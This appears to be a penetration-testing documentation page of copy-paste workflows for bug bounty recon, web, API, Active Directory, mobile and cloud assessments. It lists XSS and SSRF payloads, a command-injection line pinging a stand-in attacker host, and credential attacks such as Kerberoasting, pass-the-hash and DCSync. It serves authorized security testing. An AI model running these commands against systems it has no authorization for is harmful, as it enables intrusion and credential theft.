# Workflows

Copy-paste ready pipelines for common security testing scenarios. Each workflow chains tools together in the optimal order.

---

## Bug Bounty Day 1

Full recon pipeline for a new target domain.

<div class="workflow-container" markdown="1">

<div class="workflow-step" markdown="1">

### Define Scope

```bash
# Save in-scope domains
echo "target.com" > scope.txt
echo "*.target.com" >> scope.txt

# Get program scope from HackerOne/Bugcrowd
bbscope hackerone -t "$H1_TOKEN" -b target -o t
```

</div>

<div class="workflow-step" markdown="1">

### Passive Subdomain Enumeration

```bash
subfinder -d target.com -all -o subs_passive.txt
assetfinder --subs-only target.com >> subs_passive.txt
sort -u subs_passive.txt -o subs_all.txt
```

</div>

<div class="workflow-step" markdown="1">

### Active Subdomain Brute Force

```bash
# Resolve and brute force
puredns bruteforce wordlist.txt target.com -r resolvers.txt -w subs_brute.txt
cat subs_brute.txt >> subs_all.txt
sort -u subs_all.txt -o subs_all.txt
```

</div>

<div class="workflow-step" markdown="1">

### DNS Enumeration

```bash
dnsx -l subs_all.txt -a -aaaa -cname -mx -txt -resp -o dns_records.txt
```

</div>

<div class="workflow-step" markdown="1">

### HTTP Probing

```bash
httpx -l subs_all.txt -title -status-code -tech-detect -follow-redirects -o live_hosts.txt
```

</div>

<div class="workflow-step" markdown="1">

### Port Scanning (top ports)

```bash
naabu -list live_hosts.txt -top-ports 1000 -o open_ports.txt
```

</div>

<div class="workflow-step" markdown="1">

### URL Collection

```bash
cat live_hosts.txt | gau --threads 5 | sort -u > urls.txt
cat live_hosts.txt | waybackurls >> urls.txt
sort -u urls.txt -o urls.txt
```

</div>

<div class="workflow-step" markdown="1">

### Crawling & JS Analysis

```bash
katana -list live_hosts.txt -d 3 -jc -o crawl_urls.txt
cat crawl_urls.txt >> urls.txt
sort -u urls.txt -o urls.txt

# Extract endpoints from JS
python3 linkfinder.py -i urls.txt -o js_endpoints.txt
```

</div>

<div class="workflow-step" markdown="1">

### Vulnerability Scanning

```bash
nuclei -l live_hosts.txt -t cves/ -t exposures/ -t misconfiguration/ -o nuclei_results.txt
```

</div>

<div class="workflow-step" markdown="1">

### Manual Testing

Import `live_hosts.txt` into Burp Suite → Spider → Active scan high-value targets → Test auth, IDOR, business logic manually.

</div>

</div>

---

## Web Application Assessment

Structured OWASP Top 10 testing flow.

### Phase 1: Mapping

```bash
# Crawl with Burp or:
katana -u https://target.com -d 5 -jc -kf -o all_urls.txt

# Identify technologies
whatweb https://target.com
httpx -u https://target.com -tech-detect -json
```

### Phase 2: Authentication Testing

| Test | How |
|------|-----|
| Brute force protection | Send 20+ failed logins, check lockout |
| Password reset | Intercept reset token, test predictability |
| Session management | Check cookie flags (HttpOnly, Secure, SameSite) |
| JWT flaws | Use `jwt_tool` — test alg:none, weak secret |
| MFA bypass | Test step-skipping, response manipulation |

```bash
# JWT analysis
jwt_tool <token> -C -d wordlists/jwt_secrets.txt
```

### Phase 3: Authorization Testing

```bash
# Burp Autorize extension:
# 1. Login as low-privilege user
# 2. Capture requests
# 3. Replay with high-privilege session
# 4. Compare responses
```

### Phase 4: Injection Testing

=== "SQL Injection"

    ```bash
    # Manual: add ' " ) to parameters, watch for errors
  # Automated:
    sqlmap -u "https://target.com/search?q=test" --batch --level=3 --risk=2
    ```

=== "XSS"

    ```bash
    # Reflected
    dalfox url "https://target.com/search?q=FUZZ"
    
    # Manual payloads
    "><script>alert(1)</script>
    <img src=x onerror=alert(1)>
    ```

=== "SSRF"

    ```bash
    # Test URL import features with:
    http://169.254.169.254/latest/meta-data/   # AWS metadata
    http://127.0.0.1:22/
    http://[::1]/
    ```

=== "Command Injection"

    ```bash
    commix -u "https://target.com/ping?host=127.0.0.1" --batch
    # Manual: ; id | whoami & ping -c 3 attacker.com
    ```

### Phase 5: Business Logic

- [ ] Can you buy with negative quantity?
- [ ] Can you apply multiple discount codes?
- [ ] Can you skip payment steps?
- [ ] Can you change price in hidden form fields?
- [ ] Race conditions on coupon redemption (Turbo Intruder)

---

## API Testing Workflow

### Discovery

```bash
# Find API docs
ffuf -u https://target.com/FUZZ -w api-wordlist.txt -mc 200,301,302
# Common paths: /swagger.json, /openapi.json, /api/v1, /graphql

# Brute force API routes
kr scan https://target.com -w routes.kite -o api_routes.txt
```

### GraphQL Testing

```bash
# Check introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Recover schema if introspection disabled
clairvoyance https://target.com/graphql -o schema.json
```

### REST API Checklist

- [ ] Test all HTTP methods (GET, POST, PUT, DELETE, PATCH)
- [ ] Remove auth headers — does it still work?
- [ ] Swap user IDs between accounts (IDOR)
- [ ] Test rate limiting with parallel requests
- [ ] Compare `/api/v1` vs `/api/v2` security controls
- [ ] Mass assignment — add `"role":"admin"` to JSON body

---

## Active Directory Workflow

!!! danger "Authorized Testing Only"
    Only run these steps in lab environments or with explicit written authorization.

### Enumeration

```bash
# From Linux attacker box with domain creds
nmap -sC -sV 10.10.10.0/24 -oA network_scan

# SMB enumeration
crackmapexec smb 10.10.10.0/24
enum4linux-ng -A 10.10.10.10

# LDAP
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local"
```

### BloodHound Collection

```bash
# On Windows (domain-joined or with creds)
.\SharpHound.exe -c All --domain domain.local

# On Linux
bloodhound-python -u user -p 'password' -d domain.local -ns 10.10.10.10 -c All
```

Import ZIP into BloodHound → Find shortest paths to Domain Admins.

### Common Attack Paths

| Technique | Command |
|-----------|---------|
| Kerberoasting | `GetUserSPNs.py domain/user:password -dc-ip 10.10.10.10 -request` |
| AS-REP Roast | `GetNPUsers.py domain/ -usersfile users.txt -no-pass` |
| Pass-the-Hash | `crackmapexec smb 10.10.10.10 -u admin -H <NTLM_HASH>` |
| DCSync | `secretsdump.py domain/admin:password@10.10.10.10` |

---

## Mobile App Testing Workflow

### Static Analysis

```bash
# Decompile APK
jadx -d output/ app.apk

# Search for secrets
grep -ri "api_key\|password\|secret\|token" output/
trufflehog filesystem output/

# Check AndroidManifest.xml for exported components
grep -i "exported=\"true\"" output/resources/AndroidManifest.xml
```

### Dynamic Analysis

```bash
# Start Frida server on device
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# SSL pinning bypass
objection -g com.target.app explore
# > android sslpinning disable

# Intercept traffic in Burp (configure proxy on device)
```

### Mobile Checklist

- [ ] Hardcoded API keys in APK/IPA
- [ ] Insecure data storage (SharedPreferences, SQLite)
- [ ] Deep link handler auth bypass
- [ ] Certificate pinning bypass
- [ ] Root/jailbreak detection bypass
- [ ] Exported activities/services/broadcast receivers

---

## Cloud Security Workflow

### AWS

```bash
# Enumerate with stolen keys
aws sts get-caller-identity
pacu

# Inside Pacu:
# > import_keys
# > run iam__enum_users_roles_policies_groups
# > run s3__enum_buckets
# > run iam__privesc_scan
```

### Kubernetes

```bash
# From inside a pod or with kubeconfig
kubectl auth can-i --list
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces

# Scan cluster
kube-hunter --remote <api-server-ip>
```

---

## Quick Reference: Tool Chains

| Goal | Tool Chain |
|------|-----------|
| Find subdomains | `subfinder` → `dnsx` → `httpx` |
| Find vulnerabilities | `httpx` → `nuclei` → manual Burp |
| Find secrets in code | `gau` → `katana` → `trufflehog` |
| API discovery | `ffuf` → `kiterunner` → Burp |
| AD attack path | `enum4linux` → `BloodHound` → `Impacket` |
| Mobile testing | `jadx` → `objection` → Burp |

See [Tools Guide](TOOLS_GUIDE.md) for detailed usage of each tool.
